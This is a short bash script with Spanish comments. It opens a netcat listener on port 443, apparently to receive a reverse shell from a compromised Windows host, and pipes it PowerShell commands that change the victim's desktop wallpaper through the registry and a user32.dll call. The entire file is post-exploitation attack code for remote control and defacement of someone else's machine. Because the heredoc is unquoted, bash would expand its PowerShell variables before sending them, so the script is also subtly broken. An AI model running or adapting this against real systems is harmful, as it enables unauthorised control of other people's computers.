#!/bin/bash

rlwrap nc -nlvp 443 << EOF

powershell
$code = @"
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
"@

Add-Type -Namespace Win32 -Name Wallpaper -MemberDefinition $code -PassThru | Out-Null

# Ruta y nombre de archivo de imagen a usar como fondo de pantalla
$imagen = "C:\Users\Public\3434.jpg"

# Configura el valor del registro para establecer el fondo de pantalla
Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name 'Wallpaper' -Value $imagen

# Actualiza el fondo de pantalla
[Win32.Wallpaper]::SystemParametersInfo(20, 0, $imagen, 3)
EOF
